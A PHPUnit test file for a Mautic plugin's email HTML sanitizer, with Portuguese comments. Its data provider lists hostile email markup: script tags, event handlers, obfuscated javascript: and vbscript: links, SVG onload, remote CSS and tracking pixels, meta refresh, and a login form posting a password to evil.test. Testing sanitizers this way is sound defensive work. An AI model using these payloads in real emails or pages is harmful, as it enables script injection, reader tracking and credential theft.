<?php

declare(strict_types=1);

namespace MauticPlugin\MauticInboxBundle\Tests\Unit\Application\Email;

use MauticPlugin\MauticInboxBundle\Application\Email\EmailHtmlSanitizer;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * O corpus hostil do saneamento. Cada caso e uma forma conhecida de executar codigo, vazar o
 * IP de quem le ou tirar o atendente da pagina a partir de um e-mail recebido. O iframe do web
 * e a segunda camada; esta e a primeira, e precisa segurar sozinha.
 */
final class EmailHtmlSanitizerTest extends TestCase
{
    /** @return iterable<string, array{string, list<string>}> */
    public static function hostile(): iterable
    {
        yield 'script' => ['<p>Oi</p><script>alert(1)</script>', ['<script', 'alert(1)']];
        yield 'script em caixa mista' => ['<ScRiPt src="https://evil.test/x.js"></sCrIpT><p>Oi</p>', ['script', 'evil.test']];
        yield 'atributo on*' => ['<img src="https://ok.test/a.png" onerror="alert(1)"><p onclick="steal()">Oi</p>', ['onerror', 'onclick', 'alert(', 'steal(']];
        yield 'javascript: em link' => ['<a href="javascript:alert(1)">clique</a>', ['javascript:']];
        yield 'javascript: com entidade' => ['<a href="java&#x09;script:alert(1)">clique</a><a href="&#106;avascript:alert(2)">2</a>', ['script:', 'alert(']];
        yield 'svg com script' => ['<svg onload="alert(1)"><script>alert(2)</script><circle r="1"/></svg><p>Oi</p>', ['<svg', 'onload', 'alert(', '<circle']];
        yield 'css remoto por link' => ['<link rel="stylesheet" href="https://evil.test/x.css"><p>Oi</p>', ['<link', 'evil.test']];
        yield 'css @import' => ['<style>@import url("https://evil.test/x.css"); p{color:red}</style><p>Oi</p>', ['@import', 'evil.test', '<style']];
        yield 'url() em style' => ['<div style="color:#333;background:url(https://evil.test/pixel.gif)">Oi</div>', ['url(', 'evil.test']];
        yield 'background-image' => ['<td style="background-image: url(\'https://evil.test/p.gif\'); padding: 4px">Oi</td>', ['url(', 'evil.test']];
        yield 'meta refresh' => ['<meta http-equiv="refresh" content="0;url=https://evil.test/"><p>Oi</p>', ['<meta', 'refresh', 'evil.test']];
        yield 'base' => ['<base href="https://evil.test/"><a href="/x">x</a>', ['<base', 'evil.test']];
        yield 'iframe' => ['<iframe src="https://evil.test/"></iframe><p>Oi</p>', ['<iframe', 'evil.test']];
        yield 'object e embed' => ['<object data="https://evil.test/x.swf"></object><embed src="https://evil.test/y.swf"><p>Oi</p>', ['<object', '<embed', 'evil.test']];
        yield 'formulario' => ['<form action="https://evil.test/login" method="post"><input name="password"><button>Entrar</button></form>', ['<form', '<input', 'evil.test']];
        yield 'data: fora de imagem' => ['<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a><img src="data:text/html,<script>alert(1)</script>">', ['data:text', 'alert(']];
        yield 'expression em css' => ['<p style="width: expression(alert(1))">Oi</p>', ['expression', 'alert(']];
        yield 'vbscript' => ['<a href="vbscript:msgbox(1)">x</a>', ['vbscript']];
    }

    /** @param list<string> $forbidden */
    #[DataProvider('hostile')]
    public function testHostileMarkupIsRemoved(string $html, array $forbidden): void
    {
        $clean = (new EmailHtmlSanitizer())->sanitize($html);
        foreach ($forbidden as $needle) {
            self::assertStringNotContainsStringIgnoringCase($needle, $clean, 'Sobrou "'.$needle.'" em: '.$clean);
        }
    }

    public function testTheReadableContentSurvives(): void
    {
        $clean = (new EmailHtmlSanitizer())->sanitize('<html><head><title>x</title></head><body><div dir="ltr"><p>Oi <b>Ana</b>, tudo bem?</p><table width="100%" bgcolor="#ffffff"><tr><td align="center" style="color:#333333;padding:8px">Extrato</td></tr></table><img src="https://cdn.example.com/logo.png" alt="Logo" width="120"></div></body></html>');

        self::assertStringContainsString('<b>Ana</b>', $clean);
        self::assertStringContainsString('<table', $clean);
        self::assertStringContainsString('color:#333333', $clean);
        self::assertStringContainsString('src="https://cdn.example.com/logo.png"', $clean, 'A imagem remota fica no HTML: quem a bloqueia ate o clique e o CSP do iframe.');
        self::assertStringNotContainsString('<title', $clean);
    }

    public function testLinksOpenInANewTabWithoutReferrer(): void
    {
        $clean = (new EmailHtmlSanitizer())->sanitize('<a href="https://example.com/oferta">Oferta</a>');

        self::assertStringContainsString('href="https://example.com/oferta"', $clean);
        self::assertStringContainsString('target="_blank"', $clean);
        self::assertMatchesRegularExpression('/rel="[^"]*noopener[^"]*"/', $clean);
        self::assertMatchesRegularExpression('/rel="[^"]*noreferrer[^"]*"/', $clean);
    }

    public function testAnInlineImageIsResolvedToTheGivenUrl(): void
    {
        $seen = [];
        $clean = (new EmailHtmlSanitizer())->sanitize(
            '<p>Assinatura</p><img src="cid:logo@empresa.test" alt="logo"><img src="cid:sumiu@empresa.test">',
            static function (string $cid) use (&$seen): ?string {
                $seen[] = $cid;

                return 'logo@empresa.test' === $cid ? 'https://mautic.test/s/inbox/api/email/7/attachments/0' : null;
            },
        );

        self::assertSame(['logo@empresa.test', 'sumiu@empresa.test'], $seen);
        self::assertStringContainsString('src="https://mautic.test/s/inbox/api/email/7/attachments/0"', $clean);
        self::assertStringNotContainsString('cid:', $clean);
    }

    public function testAPngDataImageIsKept(): void
    {
        $png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
        $clean = (new EmailHtmlSanitizer())->sanitize('<img src="'.$png.'" alt="ponto">');

        self::assertStringContainsString('data:image/png;base64,', $clean);
    }

    public function testEmptyInputStaysEmpty(): void
    {
        self::assertSame('', (new EmailHtmlSanitizer())->sanitize("  \n "));
    }
}
